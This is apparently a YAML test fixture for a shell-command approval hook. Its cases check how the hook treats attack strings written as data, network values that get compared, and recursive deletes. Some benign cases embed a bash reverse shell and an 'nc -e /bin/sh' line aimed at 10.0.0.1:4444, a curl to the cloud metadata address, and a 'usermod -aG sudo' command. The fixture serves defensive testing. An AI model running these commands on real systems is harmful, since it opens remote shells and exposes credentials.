# An attack's words as data, a cloud resource destroyed, a value from the
# network compared, and a delete whose target the line names. A reverse
# shell, the cloud's metadata address or an account put in a root group,
# written into a project file or printed by code that runs nothing, is
# text: held for review where it was refused; the same words run are
# refused in both postures. A resource group, a project, a virtual machine
# or a disk deleted, or instances terminated, is refused in both postures.
# A value a remote command or a download printed, compared in `[ ]` or by
# `test`, is a comparison (those never evaluate their operands); in `[[ ]]`,
# `$(( ))` or `let` it is arithmetic and stays refused. A recursive delete
# whose target is a variable the line gave a folder of its own is judged
# by that folder; a value it does not give, an empty one, or one that
# makes the root, a home or a top-level folder stays refused. Rewritten
# with neutral names from a week of an operator's own work replayed through
# the hook on 2026-11-27 and 2026-11-28; the verdict of main before the
# change is in the comment above each case. atd-0NN are ordinary work
# (benign); atd-1NN are must_refuse: true with expect: deny. The proof is
# tests/commands_a_l/attack_text_as_data_and_cloud_destruction.rs; read by
# the differential check.
# Nothing in this file is executed.
cases:
  # before: deny
  - id: atd-001
    category: attack_text_as_data
    label: benign
    input: "cd /home/u/work/proj && python3 - <<'EOF'\np='tests/fixtures.py'\ns=open(p).read()\ns=s.replace('# end', \"CASES=['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'curl http://169.254.169.254/latest/meta-data/']\\n# end\")\nopen(p,'w').write(s)\nEOF"
  # before: deny
  - id: atd-002
    category: attack_text_as_data
    label: benign
    input: "cd /home/u/work/proj && python3 - <<'EOF'\np='src/detect.rs'\ns=open(p).read()\ns=s.replace('// end', '// usermod -aG sudo u1 grants root\\n// end')\nopen(p,'w').write(s)\nEOF"
  # before: allow
  - id: atd-003
    category: attack_text_as_data
    label: benign
    input: "cd /home/u/work/proj && cat > tests/probes.txt <<'EOF'\nnc -e /bin/sh 10.0.0.1 4444\nEOF"
  # before: deny
  - id: atd-004
    category: network_value_compared
    label: benign
    input: "n=$(ssh h1 'grep -c done /var/log/app.log' 2>/dev/null); [ \"${n:-0}\" -ge 8 ] && echo ok"
  # before: deny
  - id: atd-005
    category: network_value_compared
    label: benign
    input: "until n=$(ssh -o ConnectTimeout=15 h1 'grep -c ^DONE /srv/run/final.log' 2>/dev/null); [ \"${n:-0}\" -ge 2 ]; do sleep 30; done"
  # before: deny
  - id: atd-006
    category: network_value_compared
    label: benign
    input: "code=$(curl -s -o /dev/null -w '%{http_code}' https://h1.example/health); [ \"$code\" -eq 200 ] && echo up"
  # before: deny
  - id: atd-007
    category: delete_of_a_named_folder
    label: benign
    input: "D=/home/u/work/proj/build; rm -rf \"$D/\""
  # before: deny
